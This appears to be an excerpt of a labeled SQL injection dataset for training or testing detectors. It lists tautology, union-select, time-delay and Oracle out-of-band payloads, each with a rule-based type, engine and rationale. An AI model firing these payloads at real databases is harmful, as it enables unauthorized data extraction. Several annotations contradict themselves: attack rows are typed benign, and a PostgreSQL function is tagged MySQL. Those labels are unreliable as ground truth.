row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
330,"select * from users where id = 1 or "" ) ,"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
331,"union select * from users where login = char ( 114,111,111,116 ) ;",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
332,"select * from users where id = 1 or 1#""? union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
333,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 5 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
334,pg_sleep ( __TIME__ ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
335,‘ or 3 = 3 --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
336,"select * from users where id = 1 -1<@ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
337,"select * from users where id = 1 or ""$#"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
338,) union select * from information_schema.tables;,1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
339,"select * from users where id = 1 or "" ) ]"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
340,") or benchmark ( 10000000,MD5 ( 1 ) ) #",1,,time_blind,generic,0.95,benchmark ( is database-specific time-delay function — time-based blind inference (priority 5),rule-based
341,AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( column_name ) ) FROM sys.all_tab_columns ) ) AND 'i' = 'i,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
342,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 7 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
343,""" or """" """,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
344,delete,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
345,;waitfor delay '0:0:__TIME__'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
346, or 1 = 1 --,1,,boolean_blind,generic,0.85,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
347,1' and non_existant_table = '1,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
348,"select * from users where id = 1 or ""& ) "" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
349,"select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
350,declare @s varchar ( 200 ) select @s = 0x77616974 ...,1,,rce,generic,0.95,"0x77616974, declare @s varchar detected — rce injection (priority 1) on generic",rule-based
351,x' AND userid IS NULL; --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
352,"select * from users where id = 1 or "";["" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
353,"select * from users where id = '1' or \.< = 1 union select 1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
354,"select * from users where id = 1 union select @<@,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
355,"select * from users where id = 1 -@<@ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @<@ union select detected — union_based injection (priority 7) on generic",rule-based
356,AND 1 = utl_inaddr.get_host_address ( ( SELECT host_name FROM v$instance ) ) AND 'i' = 'i,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
357,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 2 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
358,select * from users where id = 1 + ( \+ ) or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
359,"select * from users where id = 1 or "".["" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
